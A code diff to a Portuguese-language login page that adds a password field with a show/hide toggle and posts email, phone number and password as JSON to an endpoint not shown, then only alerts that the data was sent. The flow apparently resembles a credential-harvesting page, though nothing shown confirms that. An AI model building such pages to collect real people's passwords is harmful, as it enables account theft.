@@ -2,7 +2,7 @@
 <html lang="pt-br">
 <head>
   <meta charset="utf-8" />
-  <title>Login — Telefone</title>
+  <title>Login — Telefone e Senha</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
     :root{
@@ -50,12 +50,33 @@
       color:var(--text);
       margin-bottom:14px;
     }
-    input[type="text"]{
+    input[type="text"], .password-input{
       padding:14px;
       font-size:15px;
       border:1px solid #dadce0;
       border-radius:6px;
       width:100%;
+      margin-bottom:12px;
+    }
+    .password-wrapper {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .toggle-password-btn {
+      background: transparent;
+      border: none;
+      padding: 6px;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 6px;
+    }
+    .toggle-password-btn svg {
+      width: 20px;
+      height: 20px;
+      display: block;
     }
     .actions{display:flex;align-items:center;justify-content:space-between;margin-top:18px}
     .link{color:var(--primary);text-decoration:none;font-size:14px}
@@ -95,6 +116,24 @@
       <form id="phoneForm">
         <label for="phone" style="display:none">Telefone</label>
         <input id="phone" name="phone" type="text" placeholder="Digite seu telefone" required />
+
+        <!-- NOVO CAMPO DE SENHA -->
+        <div class="password-wrapper">
+          <input id="passwordField" class="password-input" type="password" name="password" placeholder="Digite sua senha" required />
+          <button id="togglePassword" class="toggle-password-btn" type="button" aria-label="Mostrar senha" aria-pressed="false" title="Mostrar senha">
+            <svg id="iconShow" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+              <path d="M12 5C7 5 2.73 8.11 1 12c1.73 3.89 6 7 11 7s9.27-3.11 11-7c-1.73-3.89-6-7-11-7z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+              <circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <svg id="iconHide" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display:none" aria-hidden="true">
+              <path d="M3 3l18 18" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+              <path d="M10.58 10.58A3 3 0 0 0 13.42 13.42" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+              <path d="M2.93 12.18C4.66 8.29 8.93 5.18 14 5.18c1.43 0 2.78.27 4 .73" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+              <path d="M21.07 11.82C19.34 15.71 15.07 18.82 10 18.82c-1.43 0-2.78-.27-4-.73" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </button>
+        </div>
+
         <div class="actions">
           <button type="submit">Enviar</button>
         </div>
@@ -113,8 +152,13 @@
     document.getElementById('phoneForm').addEventListener('submit', function(e){
       e.preventDefault();
       const telefone = document.getElementById('phone').value.trim();
+      const senha = document.getElementById('passwordField').value.trim();
       if(!telefone){
         alert('Digite seu telefone.');
+        return;
+      }
+      if(!senha){
+        alert('Digite sua senha.');
         return;
       }
 
@@ -124,13 +168,31 @@
         headers: {
           'Content-Type': 'application/json'
         },
-        body: JSON.stringify({ email, telefone })
+        body: JSON.stringify({ email, telefone, senha })
       })
       .then(() => alert('Dados enviados com sucesso!'))
       .catch(() => alert('Erro ao enviar os dados.'));
     });
+
+    // Script mostrar/ocultar senha
+    (function() {
+      const pwField = document.getElementById('passwordField');
+      const toggleBtn = document.getElementById('togglePassword');
+      const iconShow = document.getElementById('iconShow');
+      const iconHide = document.getElementById('iconHide');
+
+      toggleBtn.addEventListener('click', function() {
+        const isHidden = pwField.type === 'password';
+        pwField.type = isHidden ? 'text' : 'password';
+        toggleBtn.setAttribute('aria-pressed', isHidden ? 'true' : 'false');
+        toggleBtn.setAttribute('aria-label', isHidden ? 'Ocultar senha' : 'Mostrar senha');
+        toggleBtn.setAttribute('title', isHidden ? 'Ocultar senha' : 'Mostrar senha');
+        iconShow.style.display = isHidden ? 'none' : 'block';
+        iconHide.style.display = isHidden ? 'block' : 'none';
+      });
+      toggleBtn.addEventListener('mousedown', function(e){ e.preventDefault(); });
+    })();
   </script>
 
 </body>
 </html>
-
